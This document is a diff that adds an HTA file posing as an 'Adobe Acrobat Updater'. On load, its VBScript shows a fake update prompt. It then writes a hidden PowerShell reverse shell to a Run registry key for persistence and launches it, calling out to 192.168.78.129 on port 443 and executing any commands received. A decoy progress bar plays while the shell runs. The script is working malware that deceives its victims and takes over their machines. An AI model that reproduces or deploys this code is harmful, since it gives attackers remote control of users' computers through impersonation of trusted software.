@@ -1,0 +1,96 @@
+<html>
+<head>
+<title>Adobe Acrobat Updater</title>
+<HTA:APPLICATION 
+  ID="AdobeUpdater"
+  APPLICATIONNAME="Adobe Acrobat Updater"
+  BORDER="thin"
+  CAPTION="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="normal"
+  ICON="adobe.ico">
+  
+<style>
+  body { font-family: sans-serif; background: #fff; margin: 30px; }
+  h1 { font-size: 18px; margin-bottom: 10px; }
+  p { margin: 5px 0; font-size: 14px; }
+  button { margin-top: 15px; padding: 6px 18px; font-size: 14px; }
+</style>
+</head>
+
+<script language="VBScript">
+Sub Window_OnLoad
+  ' ✅ Resize & center the HTA window
+  Dim w, h, x, y
+  w = 500
+  h = 300
+  x = (Screen.Width - w) \ 2
+  y = (Screen.Height - h) \ 2
+  window.resizeTo w, h
+  window.moveTo x, y
+  
+  Set objShell = CreateObject("WScript.Shell")
+
+  ' ✅ Step 1: Fake Adobe Updater Message
+  MsgBox "Adobe Acrobat Updater: Click OK to install critical security updates.", 64, "Adobe Updater"
+
+  ' Step 2: Build the reverse shell PowerShell command
+  cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+        Chr(34) & "$c=New-Object System.Net.Sockets.TCPClient('192.168.78.129',443);" & _
+        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){" & _
+        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);" & _
+        "$r=(iex $d 2>&1 | Out-String );$r2=$r + 'PS ' + (pwd).Path + '> ';" & _
+        "$sb=([text.encoding]::ASCII).GetBytes($r2);" & _
+        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()" & Chr(34)
+
+  ' Step 3: Set persistence
+  regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+  regName = "AdobeTaskHelper"
+  objShell.RegWrite regPath & "\\" & regName, cmd, "REG_SZ"
+
+  ' Step 4: Run it
+  objShell.Run cmd, 0, False
+End Sub
+
+</script>
+
+<body>
+  <img src="adobe.ico" width="45">
+  <h1>Adobe Acrobat Updater</h1>
+  <p id="statusText">Installing critical security updates...</p>
+  <p id="subStatus">Status: <b>Downloading components</b><span id="dots"></span></p>
+
+  <!-- Progress bar -->
+  <div style="width: 90%; height: 20px; border: 1px solid #ccc; margin: 20px auto;">
+    <div id="bar" style="height: 100%; width: 0%; background-color: #e60000;"></div>
+  </div>
+
+<script language="javascript">
+  var i = 0;
+  setInterval(function () {
+    i++;
+    var dots = '';
+    for (var j = 0; j < (i % 4); j++) { dots += '.'; }
+    document.getElementById("dots").innerText = dots;
+  }, 500);
+
+  var width = 0;
+  var progress = setInterval(function () {
+    if (width >= 100) {
+      clearInterval(progress);
+      document.getElementById("statusText").innerText = "Update complete.";
+      document.getElementById("subStatus").style.display = "none";
+      setTimeout(function () {
+        window.close();
+      }, 2000);
+    } else {
+      width++;
+      document.getElementById("bar").style.width = width + '%';
+    }
+  }, 100);
+</script>
+
+</body>
+</html>
